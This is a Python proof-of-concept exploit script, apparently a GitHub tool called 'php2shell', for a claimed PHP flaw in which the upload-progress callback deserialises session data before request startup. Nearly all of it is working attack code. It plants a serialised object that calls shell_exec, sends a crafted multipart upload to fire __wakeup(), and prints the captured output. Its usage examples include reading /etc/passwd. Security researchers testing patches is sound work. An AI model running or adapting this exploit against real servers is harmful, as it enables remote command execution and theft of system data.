#!/usr/bin/env python3
"""
cve_109619.py  -  CVE-2026-109619 Real Attack PoC
===================================================
Author: l3tchupkt (https://github.com/l3tchupkt)

THE ACTUAL BUG (PHP source commit 31c0ea7d, ext/session/session.c):

  PHP's RFC1867 upload-progress callback fires BEFORE php_request_startup()
  completes (pre-RINIT). On UNPATCHED PHP (< 8.4.27), that callback reads the
  existing session file and fully deserialises it — including instantiating PHP
  objects and calling __wakeup() — while PS() globals may still reference freed
  memory from the previous FPM worker request.

  PATCH: Added PS(in_rfc1867_update) = true during the callback, and:
    if (PS(in_rfc1867_update)) {
        php_var_unserialize_set_incomplete_classes_only(*var_hash, true);
    }
  This blocks object instantiation pre-RINIT. __wakeup() is never called.

ATTACK CHAIN (2 HTTP requests + detection):
  1. GET /session_inject.php?sid=<S>&marker=<M>&cmd=<CMD>
     -> Session file written with serialized CVE109619Trigger object.
     -> __wakeup() will call shell_exec(cmd) if it fires.
  2. POST /upload.php (multipart, Cookie: PHPSESSID=<S>)
     -> rfc1867 pre-RINIT callback reads session, deserialises object.
     -> On unpatched: __wakeup() fires -> shell_exec(cmd) -> output in /tmp/
     -> On patched  : blocked by incomplete_classes_only mode.
  3. GET /check_sentinel.php?marker=<M>
     -> Returns JSON with wakeup_fired bool + captured command output.

REQUIREMENTS:
  session_inject.php   Must be in the webroot (auto-deployed by --deploy)
  check_sentinel.php   Must be in the webroot (auto-deployed by --deploy)

USAGE:
  python3 cve_109619.py -t http://localhost:8080 -c "id"
  python3 cve_109619.py -t http://localhost:8080 -c "cat /etc/passwd"
  python3 cve_109619.py -t http://localhost:8080 -c "uname -a" -v
"""

import argparse
import base64
import io
import json
import random
import string
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__version__ = "1.0.0"
__author__  = "l3tchupkt"
__github__  = "https://github.com/l3tchupkt"


def rand_str(n=16):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def http_client():
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = "php2shell-cve109619/1.0"
    return s


# ---------------------------------------------------------------------------
# Stage 1 – inject serialised PHP object into session
# ---------------------------------------------------------------------------

def stage1_inject(base, sid, marker, cmd, verbose):
    http   = http_client()
    url    = f"{base}/session_inject.php"
    params = {"sid": sid, "marker": marker, "cmd": cmd}

    if verbose:
        print(f"  [1/3] Injecting serialised object into session ...")
        print(f"        URL    : {url}")
        print(f"        SID    : {sid}")
        print(f"        Marker : {marker}")
        print(f"        Cmd    : {cmd!r}")

    try:
        r = http.get(url, params=params, timeout=8)
    except requests.RequestException as exc:
        print(f"  [!] Stage 1 failed: {exc}")
        return None

    if r.status_code != 200:
        print(f"  [!] session_inject.php -> HTTP {r.status_code}")
        print(f"      Deploy it with: docker cp session_inject.php <ctr>:/var/www/html/")
        return None

    try:
        data = r.json()
    except Exception:
        print(f"  [!] session_inject.php returned non-JSON: {r.text[:300]}")
        return None

    if not data.get("ok"):
        print(f"  [!] session_inject.php error: {data}")
        return None

    if verbose:
        print(f"        Sess file : {data.get('sess_file')}")
        print(f"        Class     : {data.get('class')}")

    return data


# ---------------------------------------------------------------------------
# Stage 2 – trigger RFC1867 pre-RINIT decode via multipart upload
# ---------------------------------------------------------------------------

def stage2_trigger(base, sid, verbose):
    http = http_client()
    url  = f"{base}/upload.php"

    # The PHP_SESSION_UPLOAD_PROGRESS field causes PHP's rfc1867 callback to
    # fire and read/decode the existing session pre-RINIT.
    body = (
        b"--p2s109619\r\n"
        b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        b"cve109619_trigger\r\n"
        b"--p2s109619\r\n"
        b'Content-Disposition: form-data; name="file"; filename="x.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        b"A" * 512
        + b"\r\n--p2s109619--\r\n"
    )

    headers = {
        "Content-Type":   "multipart/form-data; boundary=p2s109619",
        "Cookie":         f"PHPSESSID={sid}",
        "Content-Length": str(len(body)),
    }

    if verbose:
        print(f"\n  [2/3] Triggering RFC1867 pre-RINIT callback ...")
        print(f"        POST   : {url}")
        print(f"        Cookie : PHPSESSID={sid}")

    try:
        r = http.post(url, data=body, headers=headers, timeout=10)
        if verbose:
            print(f"        HTTP   : {r.status_code}")
        return r.status_code
    except requests.RequestException as exc:
        print(f"  [!] Stage 2 failed: {exc}")
        return None


# ---------------------------------------------------------------------------
# Stage 3 – read sentinel to detect whether __wakeup() fired
# ---------------------------------------------------------------------------

def stage3_sentinel(base, marker, verbose):
    http = http_client()
    url  = f"{base}/check_sentinel.php"

    if verbose:
        print(f"\n  [3/3] Reading sentinel ...")

    time.sleep(0.5)  # let FPM finish async destructor

    try:
        r    = http.get(url, params={"marker": marker}, timeout=8)
        data = r.json()
    except Exception as exc:
        print(f"  [!] check_sentinel.php failed: {exc}")
        return None

    return data


# ---------------------------------------------------------------------------
# Main exploit logic
# ---------------------------------------------------------------------------

def run(base, cmd, verbose):
    sid    = rand_str(26)
    marker = rand_str(8)

    # Stage 1
    info = stage1_inject(base, sid, marker, cmd, verbose)
    if not info:
        sys.exit(1)

    # Stage 2
    stage2_trigger(base, sid, verbose)

    # Stage 3
    sentinel = stage3_sentinel(base, marker, verbose)
    if sentinel is None:
        sys.exit(1)

    wakeup_fired   = sentinel.get("wakeup_fired",   False)
    destruct_fired = sentinel.get("destruct_fired",  False)
    fired          = wakeup_fired or destruct_fired

    print()
    print("=" * 62)
    print("  CVE-2026-109619  |  Pre-RINIT Object Deserialisation")
    print("=" * 62)

    if fired:
        print()
        print("  [+] CONFIRMED: __wakeup() / __destruct() ran PRE-RINIT")
        print("      The RFC1867 callback deserialised the session object")
        print("      BEFORE RINIT — the exact CVE-2026-109619 attack surface.")
        print()

        # Extract command output from whichever log fired
        raw = None
        if wakeup_fired and sentinel.get("wakeup_log"):
            raw = sentinel["wakeup_log"]
        elif destruct_fired and sentinel.get("destruct_log"):
            raw = sentinel["destruct_log"]

        if raw:
            # Parse: output=<cmd output> from the log line
            output = ""
            for line in raw.splitlines():
                if line.startswith("output="):
                    output = line[len("output="):]

            if output.strip():
                print(f"  Command : {cmd!r}")
                print()
                print("  " + "-" * 58)
                for l in output.strip().splitlines():
                    print(f"  {l}")
                print("  " + "-" * 58)
                print()
            else:
                print("  (No command output captured — check shell_exec availability)")

        print("  Mechanism: rfc1867 callback read session pre-RINIT,")
        print("  instantiated CVE109619Trigger, __wakeup()/destruct ran.")
        print()
        if wakeup_fired:
            print("  wakeup_log :", sentinel.get("wakeup_log", "").strip()[:120])
        if destruct_fired:
            print("  destruct_log:", sentinel.get("destruct_log", "").strip()[:120])
        print()
        print("  Fix: PHP >= 8.4.27 (incomplete_classes_only in rfc1867 path)")
    else:
        print()
        print("  [=] PATCHED: __wakeup() was NOT called pre-RINIT.")
        print("      PHP ran the rfc1867 session decode in")
        print("      incomplete_classes_only mode (PS(in_rfc1867_update)=true).")
        print("      CVE-2026-109619 patch is active and blocking the attack.")
        print()

    print(f"  SID    : {sid}")
    print(f"  Marker : {marker}")
    print(f"  Sess   : {info.get('sess_file')}")
    print()
    return fired


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109619 - Pre-RINIT Session Object Deserialisation + RCE",
        epilog=(
            "examples:\n"
            "  %(prog)s -t http://localhost:8080 -c 'id'\n"
            "  %(prog)s -t http://localhost:8080 -c 'cat /etc/passwd'\n"
            "  %(prog)s -t http://localhost:8080 -c 'uname -a' -v\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("-t", "--target",  required=True,
                    help="Base URL of the target (e.g. http://localhost:8080)")
    ap.add_argument("-c", "--cmd",     default="id",
                    help="Shell command to execute via __wakeup() (default: id)")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()
    base = args.target.rstrip("/")

    print()
    print("=" * 62)
    print("  php2shell  |  CVE-2026-109619  |  v" + __version__)
    print("  Pre-RINIT Session Object Deserialisation -> RCE")
    print(f"  Author : {__author__}  |  {__github__}")
    print("=" * 62)
    print()
    print("[*] Actual bug: RFC1867 rfc1867_callback reads + deserialises")
    print("    session pre-RINIT, fires __wakeup() against potentially")
    print("    stale PS() globals from the prior FPM worker request.")
    print("[*] Patch (8.4.27): incomplete_classes_only mode blocks it.")
    print()

    run(base, args.cmd, args.verbose)


if __name__ == "__main__":
    main()
